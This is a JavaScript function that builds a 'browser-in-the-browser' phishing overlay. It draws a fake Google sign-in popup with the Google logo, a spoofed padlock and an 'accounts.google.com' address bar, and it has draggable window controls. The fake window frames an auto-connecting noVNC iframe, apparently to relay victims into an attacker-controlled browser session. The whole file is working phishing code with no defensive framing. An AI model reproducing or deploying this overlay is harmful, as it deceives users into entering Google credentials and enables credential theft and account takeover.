function launchBitB(novncUrl, windowTitle = "Sign in - Google Accounts", domain = "accounts.google.com") {
    const backdrop = document.createElement('div');
    backdrop.id = 'bitb-backdrop';

    const windowEl = document.createElement('div');
    windowEl.id = 'bitb-window';

    windowEl.innerHTML = `
        <div id="bitb-title-bar-width">
            <div id="bitb-title-bar">
                <div class="bitb-title-left">
                    <svg id="bitb-logo" viewBox="0 0 48 48">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg>
                    <span id="bitb-logo-description">${windowTitle}</span>
                </div>
                <div class="bitb-window-controls">
                    <span id="bitb-minimize">&#8212;</span>
                    <span id="bitb-square">□</span>
                    <span id="bitb-exit">✕</span>
                </div>
            </div>
            <div id="bitb-url-bar">
                <svg id="bitb-ssl-padlock" viewBox="0 0 24 24" fill="#9aa0a6">
                    <path d="M19 8h-1V6c0-2.76-2.24-5-5-5S8 3.24 8 6v2H5c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM10 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2h-6V6z"/>
                </svg>
                <span id="bitb-domain-name">${domain}</span>
                <span id="bitb-domain-path">/v3/signin/identifier?continue=https://mail.google.com/mail/u/0/&emr=1&followup=https://mail.google.com/mail/u/0/&osid=1</span>
            </div>
        </div>
        <div id="bitb-iframe-container">
            <iframe id="bitb-iframe" src="/?autoconnect=true&resize=scale" frameborder="0" scrolling="no"></iframe>
        </div>
    `;

    backdrop.appendChild(windowEl);
    document.body.appendChild(backdrop);

    document.getElementById('bitb-exit').addEventListener('click', () => backdrop.remove());

    const minimize = document.getElementById('bitb-minimize');
    const square = document.getElementById('bitb-square');
    const exit = document.getElementById('bitb-exit');

    minimize.addEventListener('mouseover', () => minimize.style.backgroundColor = '#3c4043');
    minimize.addEventListener('mouseout', () => minimize.style.backgroundColor = 'transparent');
    square.addEventListener('mouseover', () => square.style.backgroundColor = '#3c4043');
    square.addEventListener('mouseout', () => square.style.backgroundColor = 'transparent');
    exit.addEventListener('mouseover', () => { exit.style.backgroundColor = '#e81123'; exit.style.color = 'white'; });
    exit.addEventListener('mouseout', () => { exit.style.backgroundColor = 'transparent'; exit.style.color = '#9aa0a6'; });

    square.addEventListener('click', function() {
        if (!square.classList.contains("enlarged")) {
            windowEl.style.width = "100vw";
            windowEl.style.height = "100vh";
            windowEl.style.borderRadius = "0";
            windowEl.style.border = "none";
            windowEl.style.position = 'absolute';
            windowEl.style.top = '0'; windowEl.style.left = '0';
            square.classList.add("enlarged");
        } else {
            windowEl.style.width = "500px";
            windowEl.style.height = "780px";
            windowEl.style.position = 'relative';
            windowEl.style.top = '0'; windowEl.style.left = '0';
            windowEl.style.borderRadius = "8px";
            windowEl.style.border = "1px solid #3c4043";
            square.classList.remove("enlarged");
        }
    });

    const titleBar = document.getElementById('bitb-title-bar');
    let isDragging = false, startX, startY, initialLeft, initialTop;

    titleBar.addEventListener('mousedown', (e) => {
        if (e.target.closest('.bitb-window-controls')) return;
        isDragging = true;
        startX = e.clientX;
        startY = e.clientY;

        const rect = windowEl.getBoundingClientRect();

        windowEl.style.position = 'absolute';
        windowEl.style.margin = '0';
        windowEl.style.left = rect.left + 'px';
        windowEl.style.top = rect.top + 'px';
        windowEl.style.transform = 'none';

        initialLeft = rect.left;
        initialTop = rect.top;
    });

    document.addEventListener('mousemove', (e) => {
        if (!isDragging) return;
        windowEl.style.left = `${initialLeft + (e.clientX - startX)}px`;
        windowEl.style.top = `${initialTop + (e.clientY - startY)}px`;
    });

    document.addEventListener('mouseup', () => { isDragging = false; });
}